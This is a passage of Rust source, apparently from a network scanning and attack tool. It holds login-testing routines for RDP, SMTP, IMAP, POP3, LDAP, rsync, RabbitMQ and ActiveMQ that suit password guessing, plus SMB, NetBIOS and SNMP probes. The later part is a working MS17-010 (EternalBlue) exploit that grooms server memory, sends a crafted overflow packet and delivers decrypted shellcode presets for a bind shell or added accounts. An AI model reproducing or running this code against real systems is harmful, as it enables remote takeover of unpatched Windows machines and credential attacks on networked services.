    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let stream = connect_stream(target, timeout)?;
    stream
        .set_read_timeout(Some(timeout))
        .context("failed to set rdp read timeout")?;
    stream
        .set_write_timeout(Some(timeout))
        .context("failed to set rdp write timeout")?;

    let mut connector = RdpConnector::new().screen(800, 600).credentials(
        domain.to_string(),
        username.to_string(),
        password.to_string(),
    );

    match connector.connect(stream) {
        Ok(mut client) => {
            let _ = client.shutdown();
            Ok(true)
        }
        Err(_) => Ok(false),
    }
}

fn smtp_login(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    match smtp_plain_login_attempt(
        target,
        username,
        password,
        tls_fallback_plaintext_probe_timeout(timeout),
    ) {
        Ok(result) => Ok(result),
        Err(_) => match connect_tls_stream(target, timeout)
            .and_then(|mut stream| smtp_login_with_stream(&mut stream, username, password))
        {
            Ok(result) => Ok(result),
            Err(_) => smtp_plain_login_attempt(target, username, password, timeout),
        },
    }
}

fn smtp_plain_login_attempt(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout: Duration,
) -> Result<bool> {
    let mut stream = connect_stream(target, timeout)?;
    let result = smtp_login_with_stream(&mut stream, username, password);
    if result.is_err() {
        let _ = stream.shutdown(Shutdown::Both);
    }
    result
}

fn smtp_login_with_stream<S>(stream: &mut S, username: &str, password: &str) -> Result<bool>
where
    S: Read + Write,
{
    let banner = read_line_io(stream)?;
    if banner.is_empty() {
        anyhow::bail!("missing smtp banner");
    }
    if !smtp_code_is(&banner, 220) {
        return Ok(false);
    }

    write_and_flush_io(stream, b"EHLO rscan\r\n")?;
    let ehlo = read_smtp_response(stream)?;
    if !smtp_code_is(&ehlo, 250) {
        return Ok(false);
    }

    if username.is_empty() {
        write_and_flush_io(stream, b"MAIL FROM:<test@test.com>\r\n")?;
        let response = read_smtp_response(stream)?;
        let _ = write_and_flush_io(stream, b"QUIT\r\n");
        return Ok(smtp_code_is(&response, 250));
    }

    let auth_payload =
        base64::engine::general_purpose::STANDARD.encode(format!("\u{0}{username}\u{0}{password}"));
    write_and_flush_io(stream, format!("AUTH PLAIN {auth_payload}\r\n").as_bytes())?;
    let auth_response = read_smtp_response(stream)?;
    if !smtp_code_is(&auth_response, 235) {
        return Ok(false);
    }

    write_and_flush_io(stream, b"MAIL FROM:<test@test.com>\r\n")?;
    let mail_response = read_smtp_response(stream)?;
    let _ = write_and_flush_io(stream, b"QUIT\r\n");
    Ok(smtp_code_is(&mail_response, 250))
}

fn smtp_code_is(response: &str, code: u16) -> bool {
    response
        .lines()
        .last()
        .and_then(|line| line.get(0..3))
        .and_then(|prefix| prefix.parse::<u16>().ok())
        == Some(code)
}

fn read_smtp_response<S>(stream: &mut S) -> Result<String>
where
    S: Read,
{
    let mut response = String::new();
    loop {
        let line = read_line_io(stream)?;
        if line.is_empty() {
            break;
        }
        let done = line.as_bytes().get(3).copied() != Some(b'-');
        response.push_str(&line);
        if done {
            break;
        }
    }
    Ok(response)
}

fn imap_login(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    if let Ok(mut stream) = connect_stream(target, timeout)
        && imap_login_with_stream(&mut stream, username, password)?
    {
        return Ok(true);
    }

    let mut tls_stream = connect_tls_stream(target, timeout)?;
    imap_login_with_stream(&mut tls_stream, username, password)
}

fn imap_login_with_stream<S>(stream: &mut S, username: &str, password: &str) -> Result<bool>
where
    S: Read + Write,
{
    let banner = read_line_io(stream)?;
    if banner.is_empty() {
        return Ok(false);
    }

    write_and_flush_io(
        stream,
        format!("a001 LOGIN \"{username}\" \"{password}\"\r\n").as_bytes(),
    )?;

    loop {
        let line = read_line_io(stream)?;
        if line.is_empty() {
            return Ok(false);
        }
        if line.contains("a001 OK") {
            let _ = write_and_flush_io(stream, b"a002 LOGOUT\r\n");
            return Ok(true);
        }
        if line.contains("a001 NO") || line.contains("a001 BAD") {
            return Ok(false);
        }
    }
}

fn pop3_login(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<(bool, bool)> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    if let Ok(mut stream) = connect_stream(target, timeout)
        && pop3_login_with_stream(&mut stream, username, password)?
    {
        return Ok((true, false));
    }

    let mut tls_stream = connect_tls_stream(target, timeout)?;
    Ok((
        pop3_login_with_stream(&mut tls_stream, username, password)?,
        true,
    ))
}

fn pop3_login_with_stream<S>(stream: &mut S, username: &str, password: &str) -> Result<bool>
where
    S: Read + Write,
{
    let banner = read_line_io(stream)?;
    if !banner.starts_with("+OK") {
        return Ok(false);
    }

    write_and_flush_io(stream, format!("USER {username}\r\n").as_bytes())?;
    let user_response = read_line_io(stream)?;
    if !user_response.starts_with("+OK") {
        return Ok(false);
    }

    write_and_flush_io(stream, format!("PASS {password}\r\n").as_bytes())?;
    let pass_response = read_line_io(stream)?;
    let _ = write_and_flush_io(stream, b"QUIT\r\n");
    Ok(pass_response.starts_with("+OK"))
}

fn activemq_login(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;
    let frame = format!(
        "CONNECT\naccept-version:1.0,1.1,1.2\nhost:/\nlogin:{username}\npasscode:{password}\n\n\x00"
    );
    write_and_flush(&mut stream, frame.as_bytes())?;
    let response = read_available(&mut stream)?;
    Ok(response.contains("CONNECTED"))
}

fn rsync_login(
    target: &OpenService,
    username: Option<&str>,
    password: Option<&str>,
    timeout_secs: u64,
) -> Result<Option<String>> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut list_stream = connect_stream(target, timeout)?;
    let greeting = read_line(&mut list_stream)?;
    if !greeting.starts_with("@RSYNCD:") {
        return Ok(None);
    }
    let version = greeting.trim().trim_start_matches("@RSYNCD:").trim();
    write_and_flush(&mut list_stream, format!("@RSYNCD: {version}\n").as_bytes())?;
    write_and_flush(&mut list_stream, b"#list\n")?;
    let module_listing = read_available(&mut list_stream)?;
    let module_name = module_listing
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty() && !line.starts_with("@RSYNCD:"))
        .find_map(|line| line.split_whitespace().next())
        .map(ToOwned::to_owned);

    let Some(module_name) = module_name else {
        return Ok(None);
    };

    let mut auth_stream = connect_stream(target, timeout)?;
    let auth_greeting = read_line(&mut auth_stream)?;
    if !auth_greeting.starts_with("@RSYNCD:") {
        return Ok(None);
    }
    write_and_flush(&mut auth_stream, format!("@RSYNCD: {version}\n").as_bytes())?;
    write_and_flush(&mut auth_stream, format!("{module_name}\n").as_bytes())?;
    let auth_response = read_line(&mut auth_stream)?;
    if auth_response.contains("@RSYNCD: OK") {
        return Ok(if username.is_none() && password.is_none() {
            Some(module_name)
        } else {
            None
        });
    }
    if auth_response.contains("@RSYNCD: AUTHREQD")
        && let (Some(username), Some(password)) = (username, password)
    {
        write_and_flush(
            &mut auth_stream,
            format!("{username} {password}\n").as_bytes(),
        )?;
        let final_response = read_line(&mut auth_stream)?;
        if !final_response.contains("@ERROR") {
            return Ok(Some(module_name));
        }
    }
    Ok(None)
}

fn rabbitmq_login(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(timeout_secs.max(1)))
        .build()
        .context("failed to build rabbitmq client")?;

    for scheme in ["http", "https"] {
        let url = format!("{scheme}://{}:{}/api/overview", target.host, target.port);
        let response = client.get(&url).basic_auth(username, Some(password)).send();
        if let Ok(response) = response
            && response.status().is_success()
        {
            return Ok(true);
        }
    }

    Ok(false)
}

fn ldap_bind_and_search(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    match ldap_plain_bind_and_search_attempt(
        target,
        username,
        password,
        tls_fallback_plaintext_probe_timeout(timeout),
    ) {
        Ok(result) => Ok(result),
        Err(_) => match connect_tls_stream(target, timeout).and_then(|mut stream| {
            ldap_bind_and_search_with_stream(&mut stream, username, password)
        }) {
            Ok(result) => Ok(result),
            Err(_) => ldap_plain_bind_and_search_attempt(target, username, password, timeout),
        },
    }
}

fn ldap_plain_bind_and_search_attempt(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout: Duration,
) -> Result<bool> {
    let mut stream = connect_stream(target, timeout)?;
    let result = ldap_bind_and_search_with_stream(&mut stream, username, password);
    if result.is_err() {
        let _ = stream.shutdown(Shutdown::Both);
    }
    result
}

fn ldap_bind_and_search_with_stream<S>(
    stream: &mut S,
    username: &str,
    password: &str,
) -> Result<bool>
where
    S: Read + Write,
{
    write_and_flush_io(
        stream,
        &ldap_bind_request(1, &ldap_bind_dn(username), password),
    )?;
    let bind_response = read_available_bytes_io(stream)?;
    if bind_response.is_empty() {
        anyhow::bail!("missing ldap bind response");
    }
    if bind_response.first().copied() != Some(0x30) {
        anyhow::bail!("invalid ldap bind response");
    }
    if !ldap_operation_succeeded(&bind_response, 0x61) {
        return Ok(false);
    }

    write_and_flush_io(stream, &ldap_search_request(2))?;
    let search_response = read_available_bytes_io(stream)?;
    if search_response.is_empty() {
        anyhow::bail!("missing ldap search response");
    }
    if search_response.first().copied() != Some(0x30) {
        anyhow::bail!("invalid ldap search response");
    }
    Ok(ldap_search_succeeded(&search_response))
}

fn ldap_bind_dn(username: &str) -> String {
    if username.is_empty() {
        return String::new();
    }
    if username.contains('=') || username.contains(',') {
        username.to_string()
    } else {
        format!("cn={username},dc=example,dc=com")
    }
}

fn ldap_bind_request(message_id: i32, dn: &str, password: &str) -> Vec<u8> {
    let mut bind_body = Vec::new();
    bind_body.extend(ber_integer(message_id));

    let mut request = Vec::new();
    request.extend(ber_integer(3));
    request.extend(ber_octet_string(dn.as_bytes()));
    request.extend(ber_tlv(0x80, password.as_bytes()));
    bind_body.extend(ber_tlv(0x60, &request));

    ber_tlv(0x30, &bind_body)
}

fn ldap_search_request(message_id: i32) -> Vec<u8> {
    let mut search_body = Vec::new();
    search_body.extend(ber_octet_string(b""));
    search_body.extend(ber_enumerated(0));
    search_body.extend(ber_enumerated(0));
    search_body.extend(ber_integer(0));
    search_body.extend(ber_integer(0));
    search_body.extend(ber_boolean(false));
    search_body.extend(ber_tlv(0x87, b"objectClass"));
    search_body.extend(ber_tlv(0x30, &[]));

    let mut message = Vec::new();
    message.extend(ber_integer(message_id));
    message.extend(ber_tlv(0x63, &search_body));

    ber_tlv(0x30, &message)
}

fn ldap_operation_succeeded(response: &[u8], operation_tag: u8) -> bool {
    response.windows(5).any(|window| {
        window[0] == operation_tag && window[2] == 0x0a && window[3] == 0x01 && window[4] == 0x00
    }) || response
        .windows(3)
        .any(|window| window == [0x0a, 0x01, 0x00])
        && response.contains(&operation_tag)
}

fn ldap_search_succeeded(response: &[u8]) -> bool {
    response.contains(&0x64) || ldap_operation_succeeded(response, 0x65)
}

fn ber_tlv(tag: u8, value: &[u8]) -> Vec<u8> {
    let mut encoded = Vec::with_capacity(2 + value.len());
    encoded.push(tag);
    encoded.extend(ber_length(value.len()));
    encoded.extend_from_slice(value);
    encoded
}

fn ber_length(length: usize) -> Vec<u8> {
    if length < 0x80 {
        vec![length as u8]
    } else {
        let mut bytes = Vec::new();
        let mut value = length;
        while value > 0 {
            bytes.push((value & 0xff) as u8);
            value >>= 8;
        }
        bytes.reverse();
        let mut encoded = vec![0x80 | bytes.len() as u8];
        encoded.extend(bytes);
        encoded
    }
}

fn ber_integer(value: i32) -> Vec<u8> {
    ber_tlv(0x02, &[(value & 0xff) as u8])
}

fn ber_enumerated(value: u8) -> Vec<u8> {
    ber_tlv(0x0a, &[value])
}

fn ber_boolean(value: bool) -> Vec<u8> {
    ber_tlv(0x01, &[if value { 0xff } else { 0x00 }])
}

fn ber_octet_string(value: &[u8]) -> Vec<u8> {
    ber_tlv(0x04, value)
}

fn snmp_get_sysdescr(
    target: &OpenService,
    community: &str,
    timeout_secs: u64,
) -> Result<Option<String>> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let socket = UdpSocket::bind("0.0.0.0:0").context("failed to bind SNMP udp socket")?;
    socket
        .set_read_timeout(Some(timeout))
        .context("failed to set SNMP read timeout")?;
    socket
        .set_write_timeout(Some(timeout))
        .context("failed to set SNMP write timeout")?;
    let target_address = format!("{}:{}", target.host, target.port);
    let socket_addr = target_address
        .to_socket_addrs()
        .with_context(|| format!("failed to resolve SNMP address {target_address}"))?
        .next()
        .with_context(|| format!("no socket addresses for SNMP target {target_address}"))?;

    let request = snmp_get_request(community, 1);
    socket
        .send_to(&request, socket_addr)
        .context("failed to send SNMP request")?;

    let mut buffer = [0u8; 2048];
    let (size, _) = socket
        .recv_from(&mut buffer)
        .context("failed to receive SNMP response")?;
    Ok(parse_snmp_response(&buffer[..size]))
}

fn snmp_get_request(community: &str, request_id: i32) -> Vec<u8> {
    let oid = [0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00];
    let varbind = ber_tlv(
        0x30,
        &[
            ber_tlv(0x06, &oid),
            ber_tlv(0x05, &[]), // NULL
        ]
        .concat(),
    );
    let varbinds = ber_tlv(0x30, &varbind);
    let pdu = ber_tlv(
        0xa0,
        &[
            ber_integer(request_id),
            ber_integer(0),
            ber_integer(0),
            varbinds,
        ]
        .concat(),
    );

    ber_tlv(
        0x30,
        &[ber_integer(1), ber_octet_string(community.as_bytes()), pdu].concat(),
    )
}

fn parse_snmp_response(response: &[u8]) -> Option<String> {
    if !response.contains(&0xa2) {
        return None;
    }
    if !response
        .windows(6)
        .any(|window| window == [0x02, 0x01, 0x00, 0x02, 0x01, 0x00])
    {
        return None;
    }

    let oid_marker = [0x06, 0x08, 0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00];
    let oid_index = response
        .windows(oid_marker.len())
        .position(|window| window == oid_marker)?;
    let value_index = oid_index + oid_marker.len();
    if value_index >= response.len() {
        return Some(String::new());
    }

    match response[value_index] {
        0x04 => {
            let (length, len_len) = parse_ber_length(response.get(value_index + 1..)?)?;
            let start = value_index + 1 + len_len;
            let end = start + length;
            if end > response.len() {
                return None;
            }
            Some(
                String::from_utf8_lossy(&response[start..end])
                    .trim()
                    .to_string(),
            )
        }
        0x80 => Some(String::new()),
        _ => Some(String::new()),
    }
}

fn findnet_probe(target: &OpenService, timeout_secs: u64) -> Result<Option<FindnetProbeResult>> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;
    write_and_flush(&mut stream, FINDNET_PROBE_ONE)?;
    let _ = read_available_bytes(&mut stream)?;
    write_and_flush(&mut stream, FINDNET_PROBE_TWO)?;
    let response = read_available_bytes(&mut stream)?;
    if response.len() < 42 {
        return Ok(None);
    }

    Ok(parse_findnet_payload(&response[42..]))
}

fn netbios_probe(target: &OpenService, timeout_secs: u64) -> Result<Option<NetBiosInfo>> {
    let mut info = netbios_query_udp(&target.host, timeout_secs)?.unwrap_or_default();
    if let Some(smb_info) = netbios_query_tcp(target, &info, timeout_secs)? {
        join_netbios(&mut info, &smb_info);
    }

    if info.computer_name.is_empty()
        && info.domain_name.is_empty()
        && info.netbios_domain.is_empty()
        && info.netbios_computer.is_empty()
        && info.workstation_service.is_empty()
        && info.server_service.is_empty()
        && info.domain_controllers.is_empty()
        && info.os_version.is_empty()
    {
        Ok(None)
    } else {
        Ok(Some(info))
    }
}

fn netbios_query_udp(host: &str, timeout_secs: u64) -> Result<Option<NetBiosInfo>> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let socket = UdpSocket::bind("0.0.0.0:0").context("failed to bind netbios udp socket")?;
    socket
        .set_read_timeout(Some(timeout))
        .context("failed to set netbios udp read timeout")?;
    socket
        .set_write_timeout(Some(timeout))
        .context("failed to set netbios udp write timeout")?;
    socket
        .connect(format!("{host}:137"))
        .with_context(|| format!("failed to connect udp to {host}:137"))?;
    socket
        .send(NETBIOS_UDP_PROBE)
        .context("failed to send netbios udp probe")?;
    let mut buffer = [0u8; 2048];
    let size = match socket.recv(&mut buffer) {
        Ok(size) => size,
        Err(_) => return Ok(None),
    };
    Ok(parse_netbios_udp_response(&buffer[..size]))
}

fn netbios_query_tcp(
    target: &OpenService,
    info: &NetBiosInfo,
    timeout_secs: u64,
) -> Result<Option<NetBiosInfo>> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = match connect_stream(target, timeout) {
        Ok(stream) => stream,
        Err(_) => return Ok(None),
    };

    if !info.server_service.is_empty() || !info.workstation_service.is_empty() {
        let seed = if !info.server_service.is_empty() {
            &info.server_service
        } else {
            &info.workstation_service
        };
        let request = netbios_session_request(seed);
        if write_and_flush(&mut stream, &request).is_err()
            || read_available_bytes(&mut stream).is_err()
        {
            return Ok(None);
        }
    }

    if write_and_flush(&mut stream, NETBIOS_NEGOTIATE_ONE).is_err()
        || read_available_bytes(&mut stream).is_err()
    {
        return Ok(None);
    }
    if write_and_flush(&mut stream, NETBIOS_NEGOTIATE_TWO).is_err() {
        return Ok(None);
    }
    let response = match read_available_bytes(&mut stream) {
        Ok(bytes) => bytes,
        Err(_) => return Ok(None),
    };
    Ok(parse_netbios_ntlm_response(&response))
}

fn detect_ms17010(target: &OpenService, timeout_secs: u64) -> Result<Option<(String, bool)>> {
    let mut session = ms17010_anonymous_ipc_session(target, timeout_secs)?;
    let mut named_pipe = ms17010_trans_named_pipe_request();
    named_pipe[28..30].copy_from_slice(&session.tree_id);
    named_pipe[32..34].copy_from_slice(&session.user_id);
    write_and_flush(&mut session.stream, &named_pipe)?;
    let pipe_response = read_ms17010_response(&mut session.stream, "trans named pipe")?;
    if pipe_response.get(9..13) != Some(&[0x05, 0x02, 0x00, 0xC0]) {
        return Ok(None);
    }

    let mut trans2 = ms17010_trans2_session_setup_request();
    trans2[28..30].copy_from_slice(&session.tree_id);
    trans2[32..34].copy_from_slice(&session.user_id);
    write_and_flush(&mut session.stream, &trans2)?;
    let trans2_response = read_ms17010_response(&mut session.stream, "trans2 session setup")?;
    Ok(Some((session.os, trans2_response.get(34) == Some(&0x51))))
}

#[derive(Debug)]
struct Ms17010Session {
    stream: TcpStream,
    user_id: [u8; 2],
    tree_id: [u8; 2],
    os: String,
}

fn ms17010_anonymous_ipc_session(
    target: &OpenService,
    timeout_secs: u64,
) -> Result<Ms17010Session> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;

    write_and_flush(&mut stream, &ms17010_negotiate_request())?;
    let negotiate_response = read_ms17010_response(&mut stream, "negotiate")?;
    if smb_status_code(&negotiate_response)? != 0 {
        anyhow::bail!("ms17010 negotiate returned non-zero status");
    }

    write_and_flush(&mut stream, &ms17010_session_setup_request())?;
    let session_response = read_ms17010_response(&mut stream, "session setup")?;
    if smb_status_code(&session_response)? != 0 {
        anyhow::bail!("ms17010 session setup returned non-zero status");
    }
    let user_id = smb_user_id(&session_response)?;
    let os = parse_ms17010_os(&session_response);

    let tree_connect = ms17010_tree_connect_request(&target.host, user_id);
    write_and_flush(&mut stream, &tree_connect)?;
    let tree_response = read_ms17010_response(&mut stream, "tree connect")?;
    let tree_id = smb_tree_id(&tree_response)?;

    Ok(Ms17010Session {
        stream,
        user_id,
        tree_id,
        os,
    })
}

fn exploit_ms17010(target: &OpenService, timeout_secs: u64, shellcode_spec: &str) -> Result<()> {
    let shellcode = resolve_ms17010_shellcode(shellcode_spec)?;
    let payload = ms17010_kernel_user_payload(&shellcode)?;
    let mut last_error = None;

    for attempt in 0..MS17010_EXPLOIT_MAX_ATTEMPTS {
        let grooms = MS17010_EXPLOIT_INITIAL_GROOMS + attempt * 5;
        match exploit_ms17010_once(target, timeout_secs, grooms, &payload) {
            Ok(()) => return Ok(()),
            Err(error) => last_error = Some(error),
        }
    }

    Err(last_error.unwrap_or_else(|| anyhow::anyhow!("ms17010 exploit attempts exhausted")))
}

fn exploit_ms17010_once(
    target: &OpenService,
    timeout_secs: u64,
    groom_count: usize,
    payload: &[u8],
) -> Result<()> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut session = ms17010_anonymous_ipc_session(target, timeout_secs)?;
    smb1_large_buffer(&mut session.stream, session.tree_id, session.user_id)?;

    let free_hole_start = smb1_free_hole(target, timeout, true)?;
    let mut groom_streams = smb2_grooms(target, timeout, groom_count)?;

    let free_hole_end = smb1_free_hole(target, timeout, false)?;
    let _ = free_hole_start.shutdown(std::net::Shutdown::Both);
    groom_streams.extend(smb2_grooms(target, timeout, MS17010_EXPLOIT_SECOND_GROOMS)?);
    let _ = free_hole_end.shutdown(std::net::Shutdown::Both);

    let exploit_packet =
        smb1_trans2_exploit_packet(session.tree_id, session.user_id, 15, "exploit");
    write_and_flush(&mut session.stream, &exploit_packet)?;
    let _ = read_smb1_packet(&mut session.stream, "trans2 exploit")?;

    let body = smb2_body(payload);
    for stream in &mut groom_streams {
        write_and_flush(stream, &body[..MS17010_EXPLOIT_BODY_FIRST_CHUNK])?;
    }
    for stream in &mut groom_streams {
        write_and_flush(
            stream,
            &body[MS17010_EXPLOIT_BODY_FIRST_CHUNK..MS17010_EXPLOIT_BODY_SECOND_END],
        )?;
    }

    for stream in groom_streams {
        let _ = stream.shutdown(std::net::Shutdown::Both);
    }

    Ok(())
}

fn resolve_ms17010_shellcode(spec: &str) -> Result<Vec<u8>> {
    let normalized = spec.trim();
    let shellcode = match normalized {
        "bind" | "add" | "guest" => {
            let encrypted = embedded_ms17010_preset(normalized)
                .with_context(|| format!("missing ms17010 preset {normalized} in Go source"))?;
            let mut ciphertext = base64::engine::general_purpose::STANDARD
                .decode(encrypted)
                .context("failed to decode embedded ms17010 shellcode")?;
            let decrypted =
                Aes128CbcDecryptor::<Aes128>::new_from_slices(MS17010_AES_KEY, MS17010_AES_KEY)
                    .context("failed to initialize ms17010 shellcode decryptor")?
                    .decrypt_padded_mut::<Pkcs7>(&mut ciphertext)
                    .map_err(|_| anyhow::anyhow!("failed to decrypt embedded ms17010 shellcode"))?;
            decode_ms17010_shellcode_hex(
                std::str::from_utf8(decrypted)
                    .context("embedded ms17010 shellcode is not valid utf-8")?,
            )?
        }
        "cs" => Vec::new(),
        value if value.starts_with("file:") => fs::read(&value[5..])
            .with_context(|| format!("failed to read ms17010 shellcode file {}", &value[5..]))?,
        value => decode_ms17010_shellcode_hex(value)?,
    };

    if shellcode.len() < 10 {
        anyhow::bail!("invalid ms17010 shellcode: fewer than 10 bytes");
    }

    Ok(shellcode)
}

fn embedded_ms17010_preset(name: &str) -> Option<&'static str> {
    let marker = format!("case \"{name}\":");
    let (_, remainder) = MS17010_GO_EXPLOIT_SOURCE.split_once(&marker)?;
    let (_, remainder) = remainder.split_once("sc_enc := \"")?;
    let (encoded, _) = remainder.split_once('"')?;
    Some(encoded)
}

fn decode_ms17010_shellcode_hex(value: &str) -> Result<Vec<u8>> {
    let normalized = value
        .chars()
        .filter(|ch| !ch.is_whitespace())
        .collect::<String>();
    hex::decode(&normalized).context("failed to decode ms17010 shellcode hex")
}

fn ms17010_kernel_user_payload(shellcode: &[u8]) -> Result<Vec<u8>> {
    let max_shellcode_size =
        MS17010_PACKET_MAX_LEN - MS17010_PACKET_SETUP_LEN - MS17010_EXPLOIT_LOADER.len() - 2;
    if shellcode.len() > max_shellcode_size {
        anyhow::bail!(
            "ms17010 shellcode exceeds limit: {} > {}",
            shellcode.len(),
            max_shellcode_size
        );
    }

    let mut payload = Vec::with_capacity(MS17010_EXPLOIT_LOADER.len() + 2 + shellcode.len());
    payload.extend_from_slice(MS17010_EXPLOIT_LOADER);
    payload.extend_from_slice(&(shellcode.len() as u16).to_le_bytes());
    payload.extend_from_slice(shellcode);
    Ok(payload)
}

fn smb1_large_buffer(stream: &mut TcpStream, tree_id: [u8; 2], user_id: [u8; 2]) -> Result<()> {
    let response = smb1_nt_trans_request(tree_id, user_id);
    write_and_flush(stream, &response)?;
    let trans_header = read_smb1_packet(stream, "nt trans")?;
    let tree_id = smb_tree_id(&trans_header)?;
    let user_id = smb_user_id(&trans_header)?;

    let mut packets = Vec::new();
    packets.extend_from_slice(&smb1_trans2_exploit_packet(tree_id, user_id, 0, "zero"));
    for timeout in 1..15 {
        packets.extend_from_slice(&smb1_trans2_exploit_packet(
            tree_id, user_id, timeout, "buffer",
        ));
    }
    packets.extend_from_slice(&smb1_echo_packet(tree_id, user_id));
    write_and_flush(stream, &packets)?;
    let _ = read_smb1_packet(stream, "large buffer")?;
    Ok(())
}

fn smb1_nt_trans_request(tree_id: [u8; 2], user_id: [u8; 2]) -> Vec<u8> {
    let mut packet = Vec::new();
    packet.extend_from_slice(&[0x00, 0x00, 0x04, 0x38]);
    packet.extend_from_slice(b"\xFFSMB");
    packet.push(0xA0);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xC0, 0x00, 0x00]);
    packet.extend_from_slice(&[0x00; 8]);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&tree_id);
    packet.extend_from_slice(&[0xFF, 0xFE]);
    packet.extend_from_slice(&user_id);
    packet.extend_from_slice(&[0x40, 0x00]);
    packet.push(0x14);
    packet.extend_from_slice(&[0x01, 0x00, 0x00]);
    packet.extend_from_slice(&[0x1E, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(&[0xD0, 0x03, 0x01, 0x00]);
    packet.extend_from_slice(&[0x1E, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(&[0x1E, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(&[0x4B, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(&[0xD0, 0x03, 0x00, 0x00]);
    packet.extend_from_slice(&[0x68, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(&[0x01, 0x00, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(&[0xEC, 0x03]);
    packet.extend(std::iter::repeat_n(0u8, 0x1F));
    packet.push(0x01);
    packet.extend(std::iter::repeat_n(0u8, 0x03CD));
    packet
}

fn smb1_trans2_exploit_packet(
    tree_id: [u8; 2],
    user_id: [u8; 2],
    timeout: usize,
    kind: &str,
) -> Vec<u8> {
    let mut packet = Vec::new();
    let timeout = timeout * 0x10 + 3;

    packet.extend_from_slice(&[0x00, 0x00, 0x10, 0x35]);
    packet.extend_from_slice(b"\xFFSMB");
    packet.push(0x33);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xC0, 0x00, 0x00]);
    packet.extend_from_slice(&[0x00; 8]);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&tree_id);
    packet.extend_from_slice(&[0xFF, 0xFE]);
    packet.extend_from_slice(&user_id);
    packet.extend_from_slice(&[0x40, 0x00]);
    packet.push(0x09);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&[0x00, 0x10]);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&[0x00, 0x10]);
    packet.extend_from_slice(&[0x35, 0x00, 0xD0, timeout as u8]);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&[0x00, 0x10]);

    match kind {
        "exploit" => {
            packet.extend(std::iter::repeat_n(0x41, 2957));
            packet.extend_from_slice(&[0x80, 0x00, 0xA8, 0x00]);
            packet.extend(std::iter::repeat_n(0u8, 0x10));
            packet.extend_from_slice(&[0xFF, 0xFF]);
            packet.extend(std::iter::repeat_n(0u8, 0x06));
            packet.extend_from_slice(&[0xFF, 0xFF]);
            packet.extend(std::iter::repeat_n(0u8, 0x16));
            packet.extend_from_slice(&[0x00, 0xF1, 0xDF, 0xFF]);
            packet.extend(std::iter::repeat_n(0u8, 0x08));
            packet.extend_from_slice(&[0x20, 0xF0, 0xDF, 0xFF]);
            packet.extend_from_slice(&[0x00, 0xF1, 0xDF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            packet.extend_from_slice(&[0x60, 0x00, 0x04, 0x10]);
            packet.extend(std::iter::repeat_n(0u8, 0x04));
            packet.extend_from_slice(&[0x80, 0xEF, 0xDF, 0xFF]);
            packet.extend(std::iter::repeat_n(0u8, 0x04));
            packet.extend_from_slice(&[0x10, 0x00, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            packet.extend_from_slice(&[0x18, 0x01, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            packet.extend(std::iter::repeat_n(0u8, 0x10));
            packet.extend_from_slice(&[0x60, 0x00, 0x04, 0x10]);
            packet.extend(std::iter::repeat_n(0u8, 0x0C));
            packet.extend_from_slice(&[0x90, 0xFF, 0xCF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            packet.extend(std::iter::repeat_n(0u8, 0x08));
            packet.extend_from_slice(&[0x80, 0x10]);
            packet.extend(std::iter::repeat_n(0u8, 0x0E));
            packet.extend_from_slice(&[0x39, 0xBB]);
            packet.extend(std::iter::repeat_n(0x41, 965));
        }
        "zero" => {
            packet.extend(std::iter::repeat_n(0u8, 2055));
            packet.extend_from_slice(&[0x83, 0xF3]);
            packet.extend(std::iter::repeat_n(0x41, 2039));
        }
        _ => packet.extend(std::iter::repeat_n(0x41, 4096)),
    }

    packet
}

fn smb1_echo_packet(tree_id: [u8; 2], user_id: [u8; 2]) -> Vec<u8> {
